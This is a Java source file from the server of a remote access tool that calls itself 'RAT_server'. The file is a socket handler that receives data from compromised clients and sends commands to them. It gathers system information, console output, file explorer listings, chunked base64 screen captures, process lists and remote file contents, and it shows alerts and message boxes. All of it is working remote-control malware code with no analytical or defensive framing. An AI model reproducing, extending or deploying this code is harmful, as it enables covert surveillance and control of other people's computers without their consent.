package electron.networking;

import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.ParseException;

import electron.utils.Utils;
import electron.utils.logger;
import javafx.application.Platform;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import electron.RAT_server;
import electron.gui.NotepadControls;
import electron.gui.PlayerControls;
import electron.networking.packets.*;

public class SocketHandler extends Thread {
	private Socket socket;
	private ClientInfo info;
	private List<ProcessPacket> tasklist = new ArrayList<ProcessPacket>();
	private List<ProcessPacket> tasklistTemporary = new ArrayList<ProcessPacket>();
	private String lastTaskmgrDate = "00:00";
	private ExplorerPacketInput explorerinfo;
	private List<String> messages = new ArrayList<String>();
	private String encodedScreen = "";
	private BufferedImage screen;

	public SocketHandler(Socket socket) {
		this.socket = socket;
		// Adding this client to active pool
		NetData.addClient(this);
		Thread.currentThread().setName("SocketHandler:" + socket);
	}

	/**
	 * Get main information about remote client
	 * 
	 * @return ClientInfo
	 */
	public ClientInfo getInfo() {
		return info;
	}

	/**
	 * Get last received tasklist
	 * 
	 * @return TaskListPacket
	 */
	public List<ProcessPacket> getTaskList() {
		return tasklist;
	}

	public String getLastTaskmgrDate() {
		return lastTaskmgrDate;
	}

	/**
	 * Get last received data from Explorer module
	 * 
	 * @return ExplorerPacketInput
	 */
	public ExplorerPacketInput getExplorerInfo() {
		return explorerinfo;
	}

	public void run() {
		// Starting receiver
		while (true) {
			DataInputStream in;
			try {
				// Trying to receive something...
				in = new DataInputStream(socket.getInputStream());
				String data = in.readUTF();
				// Trying to parse input to JSON
				JSONObject input;
				try {
					input = (JSONObject) Utils.ParseJsThrought(data);
				} catch (ParseException e) {
					logger.warn("[input]: " + data);
					input = null;
					logger.warn("[electron.networking.SocketHandler.receiver]: Parse exception: " + e.getMessage());
				}
				if (input == null) {
					logger.warn("[electron.networking.SocketHandler.receiver]: input = null!");
					continue;
				}
				// If it parsed successfully we starting executor
				defineAndExecutePacket(input);
			} catch (IOException e) {
				logger.warn("[electron.networking.SocketHandler.receiver][" + Thread.currentThread().getName()
						+ "]: I/O exception: " + e.getMessage());
				// Removing this client from active pool
				NetData.removeClient(this);
				return;
			}
		}
	}

	/**
	 * It defines packet type and executes it
	 * 
	 * @param input - Packet in JSON format
	 */
	private void defineAndExecutePacket(JSONObject input) {
		// Defining packet type
		if (Utils.isPacketType(0, input)) {
			// It's clientInfo packet - saving data
			this.info = ClientInfo.parse(input);
		} else if (Utils.isPacketType(1, input)) {
			// It's console message packet - saving message to log
			InputMessage packet = InputMessage.parse(input);
			addMessageToLog(packet.getMessage());
			if (RAT_server.getMode() == 4 || RAT_server.getMode() == 0 || RAT_server.getMode() == 1) {
				if (packet.getMessage().contains("\n")) {
					System.out.print(packet.getMessage());
				} else {
					System.out.println(packet.getMessage());
				}
			}
		} else if (Utils.isPacketType(2, input)) {
			// It's explorer packet - saving data
			explorerinfo = new ExplorerPacketInput(input);
		} else if (Utils.isPacketType(3, input)) {
			// Error packet - showing message immediately
			showAlert(ErrorPacket.parseErrorPacket(input));
		} else if (Utils.isPacketType(4, input)) {
			receiveScreen(input);
		} else if (Utils.isPacketType(5, input)) {
			// Task manager
			receiveTaskmgr(input);
		} else if (Utils.isPacketType(6, input)) {
			// Text editor
			receiveEdit(input);
		} else if (Utils.isPacketType(7, input)) {
			// Message to show with messagebox
			Utils.showMessage(String.valueOf(input.get("title")), "Message from " + socket.getInetAddress().toString(),
					String.valueOf(input.get("message")));
		} else if (Utils.isPacketType(8, input)) {
			receiveMicrofone(input);
		} else if (Utils.isPacketType(9, input)) {
			// SoundPacket
			PlayerControls.createPlayerUI();
			JSONArray sounds = (JSONArray) input.get("list");
			List<String> soundsToShow = new ArrayList();
			soundsToShow.addAll(sounds);
			PlayerControls.updatePlayerList(soundsToShow);
		} else {
			// It's unknown packet
			logger.warn("[electron.networking.SocketHandler.receiver][" + Thread.currentThread().getName()
					+ "]: unknown packet type received.");
		}
	}

	private void receiveEdit(JSONObject input) {
		String content = String.valueOf(input.get("content"));
		String path = String.valueOf(input.get("path"));
		Platform.runLater(() -> {
			NotepadControls.edit(content, path);
		});
	}

	private void receiveMicrofone(JSONObject input) {
		// String soundData = String.valueOf(input.get("content"));
		// In developing
	}

	/**
	 * Receives remote screen
	 * 
	 * @param input - JSONObject
	 */
	private void receiveScreen(JSONObject input) {
		int counter = Integer.parseInt(String.valueOf(input.get("counter")));
		String imageEnc = String.valueOf(input.get("content"));
		// The image is transmitted in parts.
		if (counter == 0 & imageEnc.equals("0")) {
			// Parsing image from encodedScreen
			String imgEnc = encodedScreen;
			Runnable myRunnable = new Runnable() {
				@Override
				public void run() {
					BufferedImage img = Utils.base64StringToImage(imgEnc);
					screen = img;
					// logger.log("[electron.networking.SocketHandler.receiveScreen]: updated
					// screen.");
				}
			};
			new Thread(myRunnable).start();

			encodedScreen = "";
		} else {
			// Adding data to encodedScreen
			encodedScreen = encodedScreen + imageEnc;
		}
	}

	/**
	 * Get last received screen image
	 * 
	 * @return BufferedImage
	 */
	public synchronized BufferedImage getScreen() {
		return screen;
	}

	/**
	 * Show error received from remote client
	 * 
	 * @param errpacket - ErrorPacket
	 */
	private void showAlert(ErrorPacket errpacket) {
		logger.error("[" + Thread.currentThread().getName() + "]: received error from client: " + errpacket.get());
		Utils.showErrorMessage("ERROR RECEIVED FROM: " + socket.getInetAddress(), null, "Received error from "
				+ socket.getInetAddress() + ": \n" + errpacket.get() + "\n\n" + "Socket: " + socket);
	}

	/**
	 * Add message to console log
	 * 
	 * @param msg - message to add
	 */
	public void addMessageToLog(String msg) {
		String[] lines = msg.split("\n");
		for (String line : lines) {
			messages.add(line);
		}
		if (messages.size() >= 200) {
			messages.remove(0);
		}
	}

	/**
	 * Get console messages
	 * 
	 * @return List<String>
	 */
	public List<String> getMessages() {
		return messages;
	}

	public void clearLog() {
		messages.clear();
	}

	/**
	 * Sends data to remote client
	 * 
	 * @param data - String to send
	 * @return boolean
	 */
	public boolean send(String data) {
		OutputStream outToServer;
		try {
			outToServer = socket.getOutputStream();
			DataOutputStream out = new DataOutputStream(outToServer);
			out.writeUTF(data);
			return true;
		} catch (IOException e) {
			logger.warn("[electron.networking.SocketHandler.send][" + Thread.currentThread().getName()
					+ "]: I/O exception: " + e.getMessage());
			return false;
		}
	}

	private void receiveTaskmgr(JSONObject input) {
		if (String.valueOf(input.get("last")).equals("no")) {
			tasklistTemporary.add(ProcessPacket.parse(input));
		} else {
			// If received first or last point
			lastTaskmgrDate = (String.valueOf(input.get("time")));
			tasklist.clear();
			tasklist.addAll(tasklistTemporary);
			tasklistTemporary.clear();
		}
	}

	/**
	 * Windows - true Linux - false
	 * 
	 * @return
	 */
	public boolean isWindows() {
		if (getInfo() == null) {
			return true;
		}
		if (getInfo().getOs().toLowerCase().contains("windows")) {
			return true;
		} else {
			return false;
		}
	}
}
